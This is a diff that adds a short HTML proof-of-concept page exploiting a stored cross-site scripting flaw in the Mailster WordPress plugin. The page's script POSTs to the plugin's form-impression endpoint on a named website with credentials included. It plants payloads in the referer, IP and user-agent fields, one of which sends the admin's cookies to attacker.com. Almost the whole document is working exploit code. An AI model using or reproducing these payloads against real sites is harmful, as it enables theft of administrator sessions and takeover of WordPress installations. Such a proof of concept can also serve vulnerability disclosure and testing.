@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>PoC: XSS Injection via Mailster Impression</h1>
+<script>
+// Inject XSS payload into admin dashboard stats
+fetch('https://cyberc4st.com/wp-json/mailster/v1/forms/1/impression', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    form_id: 1,
+    referer: 'https://evil.com/<img src=x onerror=fetch("https://attacker.com/steal?c="+document.cookie)>',
+    ip: '<svg onload=alert("XSS in admin dashboard")>',
+    ua: '<script>alert("Stored XSS in Mailster stats")</script>'
+  })
+}).then(r => r.json()).then(d => {
+  document.body.innerHTML += 'Injection result: ' + JSON.stringify(d);
+});
+</script>
+</body>
+</html>
